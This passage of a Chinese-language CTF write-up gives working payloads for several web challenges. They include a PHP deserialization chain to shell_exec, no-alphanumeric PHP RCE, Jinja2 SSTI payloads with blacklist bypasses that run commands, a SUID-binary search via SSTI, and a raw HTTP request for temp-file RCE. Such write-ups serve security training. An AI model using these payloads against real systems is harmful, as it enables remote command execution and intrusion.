}

class PersonC extends Person
{
    public function check($age)
    {
        $name=$this->name;
        if($age == null)
        {
            die("Age can't be empty.");
        }
        else if($name === "system")
        {
            die("Hacker!");
        }
        else
        {
            var_dump($name($age));
        }
    }

    public function __wakeup()
    {
        $name = $this->id;
        $name->age = $this->age;
        $name($this);
    }
}

if(isset($_GET['person']))
{
    $person = unserialize($_GET['person']);
}
```

又又又又又又又又是反序列化

> 1. 反序列化`PersonC`对象，触发其`__wakeup`。
> 2. `PersonC::wakeup`调用`PersonB`对象（当作函数），触发`PersonB::invoke`。
> 3. `PersonB::invoke`设置`PersonA`的属性（关联`PersonC`和命令参数）。
> 4. `PersonA`销毁时触发`__destruct`，调用`PersonC::check`。
> 5. `PersonC::check`调用`shell_exec`执行命令

```php
<?php
//highlight_file(__FILE__);

class Person
{
    public $name;
    public $id;
    public $age;
}

class PersonA extends Person
{
    public function __destruct()
    {
        $name = $this->name;
        $id = $this->id;
        $name->$id($this->age);
    }
}

class PersonB extends Person
{
    public function __set($key, $value)
    {
        $this->name = $value;
    }

    public function __invoke($id)
    {
        $name = $this->id;
        $name->name = $id;
        $name->age = $this->name;
    }
}

class PersonC extends Person
{
    public function check($age)
    {
        $name=$this->name;
        if($age == null)
        {
            die("Age can't be empty.");
        }
        else if($name === "system")
        {
            die("Hacker!");
        }
        else
        {
            var_dump($name($age));
        }
    }

    public function __wakeup()
    {
        $name = $this->id;
        $name->age = $this->age;
        $name($this);
    }
}

$a = new PersonA();
$a->id = "check"; // 触发PersonC的check方法

// 2. 创建PersonB对象，关联PersonA并设置命令参数
$b = new PersonB();
$b->id = $a;       // 关联PersonA
$b->name = "env"; // 环境变量a

// 3. 创建PersonC对象，关联PersonB并指定执行函数
$c = new PersonC();
$c->id = $b;        // 关联PersonB
$c->age = 1;        // 任意值，不影响
$c->name = "shell_exec"; // 避开system

// 序列化PersonC对象
echo urlencode(serialize($c));
```

‍

‍

## 01 第一章 神秘的手镯_revenge

无法粘贴，直接重写paste事件

```python
// 获取密码输入框
const input = document.getElementById('passwordInput');
// 重写paste事件，允许粘贴
input.addEventListener('paste', function(e) {
  e.stopImmediatePropagation(); // 阻止其他可能的阻止行为
  // 正常执行粘贴（获取剪贴板内容并赋值给输入框）
  const clipboardData = e.clipboardData || window.clipboardData;
  const pastedText = clipboardData.getData('text');
  input.value = pastedText;
  e.preventDefault(); // 避免默认粘贴重复执行
});
```

还缺少密码，从描述中知道了密码的名字，经过尝试发现是`wanyanzhou.txt.bak`​

![image](http://139.196.222.108:40061/i/2025/08/27/2m7a9c-0.png)

```python
XqRqsDZWVYjoXvSwMYGklZOGwVpnmPKTPJXhTiFKvhvcseSrXEbawElbdYmJRydaISVcmpLTscDEPSlbIkUNKEvdzivnsrfSCnGolKgQOmVFhxKxhMitBzNeBHNyOgwckpBKdMveKRzqTIrcnvhVgXoxZrjKmuFkFahmHtmTSCKjnjethRbwMPKeJbyLSPAzROgVTuNIChkunCQdCLnoEJWzTscdjGHYzuHJZPMbxqtWteSbkogopAGBxprYdnZEGjfhJfYKlVlVarMHKwlHcIpsHwXgcsvWVKijiTYiQTfpIMHfqyroLmSqLgugtVlDQXeaGTxSWCfkMsMxnucRAxvKeRkUkpnfLrAtMfnBpgwbgLSHsXEPcUxuJwcdxYEfispMnEluMGWPtiKWukWJmcixVbTrgBhRmSqeMWZorscrwsxerZnmKRmbcBIukPQIHOxeoPOXnbngPGdpFrnoDAhCkuQeyDreHKQIutGOwDmQrtuFZYZwPlDMuBZPqPcIDrSHUZvGQKDLARkVfmEQdLeBSVoRAOUJZXAiafPXCMigwuNPzElbajcHnpzBfUvxhDTFvdRsbnvdaYDmyjkNLqrFbRqspCJxrFAJaZkEisEaWkgvnTPTCZvPStbzuAVJRJqcnthlUXbigHdyMERTwFmhGktdbvyHxMWZkIhkMhDUHcrnrqezOsoaZLvifeiFLBUlHJEhtHoStqBtQRenMJPVWLzoFCtBlVSlUaQKnXCedKVGocnoWJiOfnpXVPOxAXQITpeXgfdmszXzOTEdTjqnEPAbQcOfRQFnZPNeygovEvmlhZfKNHQeRcnjHweNceHuFBTciWcFSQNZmIlnpiMkqiQyZOENdGFayRLHRuAHYcFOeZoaWsVwciPUtHRdNxfBtENIVDTPzqnBPdtRdOVWKEaInMAmgTUFSrdghOVOefjxtitiabICQNdLUItQILjyAhCBvnTmzHALWouisBfvTGtHjcYShuKdejEobmfYOypmQRJiKeUAyIGcKPsLDYOVAdIUgujXMsDsOLyrkCqjVAwkJnymwVcIGQPXixGWZWpychnsCINBItKqzcmhoYLWhadHoihjWVBlFgpHKfXpOjXYdhBLjfZUFICrlIEJeDztXIhnMsRITfNhFSjfsQwEktpzryjKvoedbAgFGnIshgIwyJANiKQJzdPdZkckQPVXYAKfekJvIwlQTZOwhjepNEJGhyahbEuNPtkCXVaNVkUvQHRAQVXtAQGTBUlWpZwfuFjKwvjNfzkCmcVeCPUCRSDXKSKQjNOkmeYabmjtNVYclVEredbjBiqXWeMCXaXPltDgneMPJaGIYHyfbWqNLwJCqPsdJxCDvaIuYXDHVLfwPwQuvUGcXvJZmcyACILNBDHnGKXFnUpExHTHrcgyIKCDSzeUsyOYfxnKyAmsUPgWgfdcJuLGAPnLvLnFuKXNUThohGpagqOIucLUtSHYBJvlPzLnJXtBIryPDyWtZuvOcoLBUkWapklHXLNQDonMyunmuoAuqkvdCvWXvIrdXZtHrgwsDuZiytotfKBAMwNGiVDZGlMzPKGpIeFzCLuXYsVXQZfYXoPuBNJyEFNvhlnzDbAieaNycIwKCtysQxbjejrEJVzuaNWpKqaduNtdmAjFpQFKFkoukCGsoscynKmpOTRhBlKlcurfCSzckDmrABkvUnTJBGBjKQeVEZRpfcdNbqEJAGfeaMtKiqfKcmhjngjEuVQaDmgYOdRxGOBGIRBgNCwsUAqNhVxzPkVSkNRLuVbAEApwnXjeipSbNDROtZSuPItgRUIJGcDiSxJwgcqximjKfskPXuHbhowALsYRPrjrteNPhiUKQpFgYlRBHJMuOQPtIYcIPIFHTpwMVpRwRvjpDKzlKmuXZVHAvswCIGoHxMahgaueHzkQhrGXdiXZswbkbpsOFOskXcgBUXBTjXacDJzbqFYhMpQXykStZCMJpmzkBfygwmQERoDIyMCGiJiCmOyTmrepOZIxfPlONsapLxOACdcfxLxsMLUsMziTpqcxAOpFMvghzFYRSwMQmGLDiaQsTZAZurHBSuaFHmXQohjUSqicRyHfrtIKygKBsCdXWTDgzcvHYGnbghSlMeHiMHQZtFoyPoVxyPNgnUxgiXZpXWokTBfnuXLDxqkyBnXWlIwFODufTCoevNmvHKZFAhPNOfuJxnqyfigeihgefMyPRGtjTwPxgkFGleTQOczfIhKVOSAwkfYLzesAxSHaqsWUfdRIxVmgsdedlnRFKHbRIMUHcRELhMLcpGiAJmqmQKECsfpXUvtBcrzRQcORBDNPVlQjdsHZXaHNOhQbdigsdszLIHPnXzqbKhBchruNLjBlaydvIHTVmSlyHtIyCyFocdRlJTozqSQNAvQySRZpNqUPzpQuKWLxUPbhYjvGlEpLWnPenWboqEfEMsAIxdbJQMKfNXakvwtRsTyHMSPOLIGxhLCiEnBnkJLFiDrkLkqBeRqxatdzFjaOVwhEKLAWxHViZadRjfQfoPOnuXPIFLPBnAleremNPcnTwAjgZADfYxlDrtcoQFGubCdTYPFSqXPjOUeAGFuwRvpeQWowxajsTnMcOfPtYBKqJwUQTislZbOsMyBpFCQaQYjSKyxGcSyceUGvtOhxImvTmiMfsmejhFAVALTvdRGAInBuxibmSYloasOJIntRlxjWeQGVklDfBGUkrAfvtNXRVBOvltzigxMUmEIhIjIgwYDWhCUAgQImixmgXDYQHUPRdfNGerNueMivayPSNRheVPTVhPaHDvFPcedCpRGOcAXLBrPnKlyHjDueOZdpfZKabnbdvYilMSALQHjVfkDjXVgsvIyNZEcfobkydwZPfKqTCXgPkPdgVaBmJKIYNmGxStldrBjZAykFDMfoiFIRLGigwdRvilQdycSAuXShvACVReSOifjuWlOSbKhXjfPiYibMxwIOcYtqJDBsbzqsMpsUbnVOVNCBHCVwbaghdaZwKwOcWsFdTxICJWXrEgJKWVrtPLUnYehdKUIbHUxWvzflPvLJMIJdoPNcjlPyZuYbrNgznMPDQIskYGeKHEIxbsAzFGPSbHEYIfnakwrHtifynYQBGcIMtEfSTmzltyveQBEdyrPHurWSEPiEGaGFHNtYqFqZSvMOkfEkFGNUNehiTqrLJMZPmjBSlnkLaQtjTslRqwOSmxZdQzpgBzTFVxLtBnUspHSqUyBLXbRMViuwZnVFyEFEyzlISCdtwpnKanKdroLgotHdEhGyucMuGyqStCiZbxKIlMLvuhLTUNbmXYhZbfTrHGlYbMjsXAiQovPHQrfvEjkiZVgyhEVPRkTzyAucZgafPFGOBXcSkOXKdlZrZpXQOJCKLtzBysNKVkHEgyrQPqnUKXILyujGsFqXzfLpDjewEmzGrGhRCSumVlXrwoBXRljkWHGDUsNUAdZKUDOwejOZifSOHJHiKCYNGtbdQEPaFKPnaYQzfxzGefKtAbRuJoZmHblZmwKrODQVMUOqmIZOuxzraxWdtpcRHFZCJlTdMcQLFVuTlOQNCkEPkRTFPLVNAqImzvpsWcNMPIvulFEhoWSDXlwpeBZxKIZApQOArGWITaVteYWBoEkHlPjHkQwxDnRfDyRXqjbzVgYcTDsMafXLustotnGcrbNyDimSxCiatNVnKgnTuyUYJtUdSAgJwLeFSPuAIfvbaxYNwRgDoGtaQcFxgDJMFgpCIuoEdwDChkoBVfDkaihdmPQZTwGcyNiSHpXLZfrszPoroaFSFoyZVysuPgwQpEQWQYqwLmfSCktrnuAUktVGnDvspNePKtABerKUsrjhJZnBtEsiRwoGDYVoSxzhDbLWysDJUWECVbNDtZEPLawlSblaIPtIfLJxpaJQnXQgVKIuWDZLmAlWfzxGmxEjtpLBmJCsvCyMemqylTnRXgqCzhfROrdtdPcrHtntoGyKnqjigbEfkdykWKlwQruRiDIVequOEJbHXdQCMIQAMTDXLQTgcLqmQlStExIAKMlNSXuhnUgYwTlVrqpadpTAzvLsTcopFOraXmxqCGqDiZhyUcWdraLNaxYlDTdjVkjHaWLVNDKvrDotXPOdLwPKGHiTpWzghIyopFBMJPEjaQlNJhZHctpMgvUawLrLnyuTxCejCavTOgQBwDFOdIZeawkGNWmwUzFauLxsqimLVSnEWPZYRAKHwHIWjCrPjtXTCeaCkVlrjRzhEvlwmnmrjlPqioroJpZDvJXtpOtHmsQheWgUnuDqjLUjWSzgdmuHBiNGsexkrxWqjIWCesrmJFgsLALwDKaONSCnKGTYvSHqsCdEnJmKbItitgTOlSigmioFqtEyaUKpqtYhWUBrtsLcfmfqojPScvTayNOmiJvAfczBUCUqdZexCqfBjsufdVdlKQWSVLfCnBydqAmVdhAnlSfrOTAIrgVXueYGjoJIByCoEJRtomAUqrTIcvnIdMoMjXkTEUjEwtEWorwefkTGalPEPnCJRjZJPHOWMPswlApIuNblsAXKXEnoxsaIwvhyOkHyMiYiFoCjXfgwlpiETVoUDfVqFpXclvKnwinPNHDRhnQwJZjATsqslVLeSMwSCIJTnatMuxMcAWrJdnwjWxYKHmJHOyEceCfwsmalGwVtJNXLpikQdhMYDYKFCxGrtSNaceCVuiEvQyBFycgCSwvAVjulXqbreazYTZPRhZdYqsvNKQfRpqITJXYZEizdNUCSRlNUKSGIrgLzBRdWfSzEObyJyCDlspgNPukmbIDwloSGWPXUbnoZPaZISqjkGlRihGcOtHmkwFBrhGIxutiLOZLfIvLpkQpcKcJvcYSoMXqiNYgrGvfTHFmKCwgdIGNmWPcwyfJhIphUJYjAMgFPzPMoWjElspZCbXDkQzihAwSlxNztzMbaUxEXhAizBxopqZMYazFBXQtBXSncriVJTgLbZrNfGFjctMTEmObPLpENwnovQHnBnPqYhFkqVkdqRoNoveCdoTGmgzlRJatIpByQGpjelGEmTGHELfxsIruzldvLMihnPzhLrfKMgCVOSOvDUrYhiuxnlVNgtilbQwoWbyMciXOQsfegmznLtaMzunRDscsnQCvZcwjtLWkuvidyjSGOSWGIRGzGyWcqjyJiWejPzIdfzLGaCSvNqhwEqAvCxcGVspJnyMgiXHOfetWgMeWGmoXHsXIucVwEvHaDWbidGZaTMzYTrKQPwbDbcRnUDymaMhuTYPlWqdNsTngReMqSvwDeBIjkIfDTnJwNvaUMdCrSiJYxbYAHgyTIvThjptWEDlhEBuIvrgkiRpsVpTruBKuJAZRHFBTBAxqKjyZVtscfYoJAwrvmpWCYxWAcvOjOGWuvphnjoTcpcyopaHPSYNSFpLhdsVqusxufxbwZjzwhGHjsCkvWUDHioXebCGemDKSutHqiOCImIhsvMcgfSvMcuvAdEhuRbDHqeVFzIMwUTjZrBNzfwcenAucPrjhOKOFXNKnwRBdiucOjdraiEGfDChPLiYkEnifjEoIDjRSDuNBDMRDxtCDLscfXtRCNZxWfYeKCpzYBiSrMoIpUbRklzEVwQVehVpkFyVrVtujiSPOLEFOVhCrDWChnroYGOLFwItVbxfZlzjkgOvdAEdTjLebjyKHSEYvMduWainHlZHbtIADMtmXOjyaVsasBDemSCOuLaFeAMatFmqPYgoPBuwgfhxpMngLGthLNaDRySnrXiuXGdsXebrmUvdueGmUSmhIuXJOVGpOhqwtzIcuirDThNsyLdExgVmHqUptlwLJVQwSlZOuVTHrbfRhuibwpkJwJkDPUGwGLyZorkRskRTqaeHlClCjQyOPZTmNzpDHxndJVsxAnpLuqHNktLHrGaPKTeDlhKWtxUltveFDgBERTnKHaSHdaZDKPxlKWmvGnQCLZJgSaVRplUSjaXjseKhXlMxdvTYJNsOgislKzLnepaxWECaTCflPMuJzOCMdBgCribrHLGlpBqTkTEcVHgoGQWUjVTUzjyPUhWbiBRxckxGThXqexUSgFmtfdYtKhTWtfjxoPiMYVBqERcWxoRkQSkULJiPhCSfXoUykfGSimlmHBHzWbsagTJdgYoKFuAjXCqKvnukUclWZVANxeRvCXUqojAgEaByFkNKxLgKObKgsHRijRzxQVaUprskCmATLwvgiDyIndpeaSiPljfSAhRtLwEtJBODxjtyMzIomksXUGbskQjSPdgwxJWaejgnfxwJrdHgMCrSrwBTuGfcojXVLWNClYvzJTyDXrLzkSqxbcLHdvcFMnwGMwLERmcmDUQuIvUdjIcJKXULTyPchlWLxVpuihKemfgFJfGApvzAnjShbxKUqAtBDPtpIgEKdyidUqNJocWbnPEbMxCZhRUjTrVteNiFDVmNaMBNetaWEtafXncKfEXYptvijKGuiZXgmoFBTHBriRIcDBdZJIaymIuZkNuZKWmpTLhScjTiJrKJDXvZeGVNJTDINafpQwiPkqbIvgqCTwkCWhZrgQIHuBkBgwOnOTCEHRxpaGbMJrsgLEOInhVKIwhIhgVjtqArCYijwoMhnsOqziDfnIZEfDaUOhSVyqhWKZIJsJfNWIStPqbyFmZPlnLYwbSoEkxwRSTfznbOGYrSjCSRlPEytycnVXAesjgQsMjuetJvdGSjxoNwufCPvxMUqDPKeQTsXQcIRQGoqCUDbZlHbYkFqJhruVmRiWGpDiPSKXOsBHvPvJNgaSOSHrNUiOwvBUgzWrTcBWAKrkBMobfONCzmXbRHganRgFJZsgvwTmkLiXfkyqcYjSWHKoSoyWOgoFGhXPturGEUCuIVBczaLnxzUkmwFbKAkcXuzaiByLNEaugBXnkXtuAqDKuMtMxGCKQHPIWtwkXoEXaCzqVnlmTueyDsKmQuqOBPekMIfdiSbHDVFbhbaUVPIFPchCuZxFBRaKceldvAWvgIkroVrHpvIEiHqBIYxGyueUVTWPoDZRnrAStGFHwYczxVuPKXEUHFpHDjHcDZTmWhBmfTJvRSLUYhieMwGCDevGSfMBPzEOGiwsGbgmUfXYmnraIfPRxPuvkOrDVrAqfTOrvcXhUSHYJPbhqOUAFepOuGwEuoKcOtrpbZKOFCziyUpAXzSWXDidtDCFnlIqaCfzWNogViWoPhSnZYESkYRoiaoaETPhnswIXoGhbRpmWkFkOvPmoWexFEGntpePDBePblefuMvqBAtehBAzYdOstJLrymkahWgKhftLgmHZpBNeGmKcZafkLkRMIAWkqWYdxPYQkQewixKynMQMrqCiMwSZjELaWecgsqphcanAFEZycECYiSBoajuMlZdlYQtPejrvtYRsugRbVlFaWDbGAsVOAyERmNDPswIlDoyhZuWqonEVztwxyrmcyVmvCYkjZjwmzhTfnDSLIzgbxgAXLGptfGhVnXpktjfCzbLNtojTmpUekDrsIPYPXPsQroMOwMLvTnUnqnmzqASbduRJeGNAmgKvprEHOyGTFJWbafwEdxphKzOviNwfPrBuGwCYZhOVwirGHQDRtsfPCVgEmpsdAJEXBzfnRYiaqJRyfOFGadaJSXhfhsKfiCbakLbfENXFXdhpyADSNbDmQWUpbPMtCkxsRGJoaKcLgeKmzqSoHaLoSuAWZqvIMfCiEfyCmGPadaHumUlFWrntbTNqukENBzEFObGrNTXNbKBhXCupKDIJNykATKfBQvzSYgQELWUfepXnBFncFqCHCTxCLMfPUpaUkRtoJMbpadzmyHfQEHpGatSqZohDJBxMajbXdRFsHTpXzTDgYRnpfzVPEFsknYZaXdNezYIZTeczgOZTlYhylchNEHivrFhihcxYNIcDGixscIDYkbEYuloZqdmFLNaFDUGcgMQvlYwJSdsPgvuseuOAYiaFOnkCrJgWnRCJuHGZEyLJEuEDedwphNLMrpdvgRVENLRpcMaqwgOwrVOjcjgSahSTAOxiYlQpsbApqtqYQrOpczjaTnvxhUclzYJuqpLalVRmLZlieUNefYNLwJNJZhoUxtOxLDTQXJlswXMprgjwOPDPGiVNtQxzshImKZNvZtXIRiMsIhqjyIBurirPcwVaTbKqiTFtzbzHkjPIBYeKTSNrmNHnZgdrxAkJmOyKZWPIsQvxFSriYRSkABozQclJizGaKitcrfWowxpNKmzCsqwTbocXjKfujNSRKWUyUWqrhXtgLSXgItLZtorjiKPzinOxdvPGvYZyPLfvlAMIqUgSCmhNExifbfwPlriPnYVljZvzWEqXdiTYDzjhYgoiYJZfpqhrkLdcxkMIXDFBnFEVXlvHtaloYiNTPYRvDgwfWmwKRspCelMYAghSUjskGmnjDJWIMYMYPEaoqiYEZnCyzEIprFumcLiVPKjObkUpdirdoDzBLGvikaEmXjTMpEdxmsAqdfwOrqrSwxBWXdfbuAtEdPYZRqnTaopFjvplSHOntxIFjnjvnmlUtofmyRegkaelImWYDHJpbfyDEHbGFeHRZngNyKOsarinDhJZTrdNxltQOnwoKrkHsTKofRymjVSNdeRFvrlRVclbFUJlNbiENwOeAMeTCuBoJFZMrgtegqcRKQdaFpwhcUFOZsfMTkviehQFCAvZborgWjSYhWQzHAsKmEgwfWmJYvHTPuSKOmOyFjgkvHIuPIbralqLBDQiDutlcUxmcXdSYgemREgfLVQNcNerMnuCkqnrYzisxzOxnBfCJQfGTvxbvnPHRzImrOGNvjCYWnGQrBotaUgZcHjfHBqsUrgYQspgqTjsxUvrmdpLebKgSivumvjIkoqwCeBpJwbHvOpkWQwVREFOyFaeDzPelPykaxDumJRzGMQlvqDhFySqDzTRxpWLESyWDrcBIBHxESudenUdquFVwTjITmaqngtgRjhSLdtXcNPFVkgWyHEofdAvLsFlmKlHZQxZWCXqtyndzRHfwZxjtGcLjcRNxazLDqtMqRabYxyCUKxNcaFkAJMiJaqGLQthPIYvQeusnmGJuVTEtkPzKoTYDERTHrIwhSxDubOapIcYQLZrpJiJhiKrLVjQKubkrwDJSwAtmnrCXUFYZWLGlyZBYigmUtpTzyLFRYEWlOjSEDqmQktdvUFVSuHZwNRXWmfUjMOwpHmSwXnXzUyUkEYMWVUePdEsvPEUeWnkXJcfaOubzFhLQbvMSolejybMvLuJYbkxgZQLAMyRfOAPjsCobsovaWawNcmRHfmCNlkRWbZEhGXQMrlWAreWJtlISGlxdJHNmzQhuFuYLIdkdYRaYJWpFbZHbNvcmGukGSyKoLwVANVJrkXJGoVJWnIrIniacQVsvUEsUioPnoYhyCUsegXOsRcvcHxZfpmRkJUxyjYaZvFrnmIFAmzindESEskJVJmCnGhehMhLCoAMbCENszFLXchIwUizywEFxEJsizGlCrEWmhLWmpbFeOrbEhEgFkpelexDQkHXHlYjOANomnxlPZuByRZLDpdXLAZDZocOupMonVtIoBlaPUvMDpZvmKhNyPXZLEMWgjEBUPQBhZjvBNCSkuqMreXSCbudhGAmYiTEBlUDoRsZgTPVnlFaYIrvOPvbFkiCxbCDhlEmvpsjSgdEXtYgOxdVTPvXeftPzdsXUfhfQtPIEIcQnGYernWaFJyfDcDxNoHmfWzQGrGqnrhCPVmJavXBLChpGialPrUSTDHcMlJedpdFDKDZIHJPRMCmBaXkYFqSIFYpqJrlEBpzDGROVdkLWSZdzuRHwQJoPkVIvRUDpWXqVbzWLUPNSHEKwIvmojanGqGAUpODlgnWPOUjHpSGnKrOkDPAKAXtLGifiudqSKegAUCNbvBpaeJFHqyvAjdiyfTRpqCNlDVEISCZUfvnIFtxReYGwCXIhwcDbevHcDGQOLpzPHgcuojXiZdSoRYgoVmduqghYIYLmQWKvKCaZHtSNOMnHeQxskuQRebzDvRigACxBmCRagYpmtpb
```

次数太多了写个脚本

```python
(function() {
    const config = {
        inputId: 'passwordInput',       // 输入框ID（页面中已确认）
        submitBtnId: 'unsealButton',    // 提交按钮ID（页面中已确认）
        // 将获取到的启封咒内容放在这里
        content: '密码',
        totalSubmits: 497,              // 需提交的总次数
        interval: 300                   // 提交间隔（毫秒）
    };

    // 获取页面元素
    const input = document.getElementById(config.inputId);
    const submitBtn = document.getElementById(config.submitBtnId);
    const resultArea = document.getElementById('result');

    // 验证元素是否存在
    if (!input || !submitBtn) {
        console.error('❌ 未找到输入框或提交按钮，请检查页面元素');
        return;
    }

    // 解决粘贴限制
    input.addEventListener('paste', function(e) {
        e.stopImmediatePropagation();
        const pastedText = (e.clipboardData || window.clipboardData).getData('text');
        input.value = pastedText;
        e.preventDefault();
    });

    // 提交计数器
    let currentSubmit = 0;

    // 提交函数
    function submitUnseal() {
        if (currentSubmit >= config.totalSubmits) {
            console.log(`✅ 全部启封完成！共提交 ${currentSubmit} 次`);
            resultArea.textContent = '🎉 万言启封咒已生效，手镯启封成功！';
            return;
        }

        // 填充启封咒内容
        input.value = config.content;
        // 触发输入事件
        input.dispatchEvent(new Event('input', { bubbles: true }));
        input.dispatchEvent(new Event('change', { bubbles: true }));

        // 延迟点击按钮确保内容已填充
        setTimeout(() => {
            submitBtn.click();
            currentSubmit++;
            console.log(`已提交 ${currentSubmit}/${config.totalSubmits} 次`);
            resultArea.textContent = `启封中...（${currentSubmit}/${config.totalSubmits}）`;
            // 继续下一次提交
            setTimeout(submitUnseal, config.interval);
        }, 100);
    }

    // 开始执行
    console.log('🚀 开始自动启封...');
    submitUnseal();
})();
    
```

![image](http://139.196.222.108:40061/i/2025/08/27/3kmupu-0.png)​

成功，再次输入密码就能出flag了

‍

## 这是……Webshell？

> 无数字字母rce

```python
?shell=$_=~("%9e%8c%8c%9a%8d%8b");$__=~("%a0%af%b0%ac%ab");$___=$$__;$_($___[_]);
POST传参
_=system("cat /flag.txt");
```

‍

‍

## 20 第二十章 幽冥血海·幻语心魔

![image](http://139.196.222.108:40061/i/2025/09/07/nv9cyr-0.png)

username存在ssti注入

![image](http://139.196.222.108:40061/i/2025/09/07/nvg09h-0.png)​

可以被执行，直接梭哈

```json
{'username': "{{(_114.__eq__.__globals__.sys.modules.os.popen('cat  /flag')).read()}}"}
```

![image](http://139.196.222.108:40061/i/2025/09/07/nvxsy0-0.png)​

‍

## 21 第二十一章 往生漩涡·言灵死局

![image](http://139.196.222.108:40061/i/2025/09/11/m94uec-0.png)

同样是ssti注入，但是多了`blacklist`黑名单，需要绕过

```json
{%print (cycler.next['_'+'_'+'g''lobals'+'_'+'_'].os.popen('cat /flag')).read()%}
```

![image](http://139.196.222.108:40061/i/2025/09/07/ov2ec9-0.png)​

‍

## 22 第二十二章 血海核心·千年手段

```json
?username={{lipsum.__globals__.__builtins__.setattr(lipsum.__spec__.__init__.__globals__.sys.modules.werkzeug.serving.WSGIRequestHandler,"protocol_version",lipsum.__globals__.__builtins__.__import__('os').popen('find+/+-perm+-u=s+-type+f+2>/dev/null').read())}}&password=w
```

rev是自定义二进制，strings可以看一点源码，使用了一个叫rev.c的c，然后在/usr/bin/rev.c找到

![image](http://139.196.222.108:40061/i/2025/09/09/oqzd-0.png)​

```c
查看是#include <unistd.h>
#include <string.h>


int main(int argc, char **argv) {

    for(int i = 1; i + 1 < argc; i++) {
        if (strcmp("--HDdss", argv[i]) == 0) {
            execvp(argv[i + 1], &argv[i + 1]);
        }
    }

    return 0;
```

![image](http://139.196.222.108:40061/i/2025/09/08/12eni8e-0.png)​

‍

## 这是...Webshell?_revenge

临时文件rce

```c
POST /index.php?shell=%3f%3e%3c%3f%3d%60%2e%20%2f%3f%3f%3f%2f%3f%3f%3f%3f%3f%3f%3f%3f%5b%40%2d%5b%5d%60%3b%3f%3e HTTP/1.1
Host: 192.168.0.166:55362
Content-Length: 290
Cache-Control: max-age=0
DNT: 1
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysDh6g03MqJBgoRi2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: close

------WebKitFormBoundarysDh6g03MqJBgoRi2
Content-Disposition: form-data; name="file"; filename="1.txt"
Content-Type: text/plain

#!/bin/sh
cat /flag
------WebKitFormBoundarysDh6g03MqJBgoRi2
Content-Disposition: form-data; name="submit"

上传
------WebKitFormBoundarysDh6g03MqJBgoRi2--
```

没出需要多是几次

![image](http://139.196.222.108:40061/i/2025/09/09/xuhdxf-0.png)​

‍

‍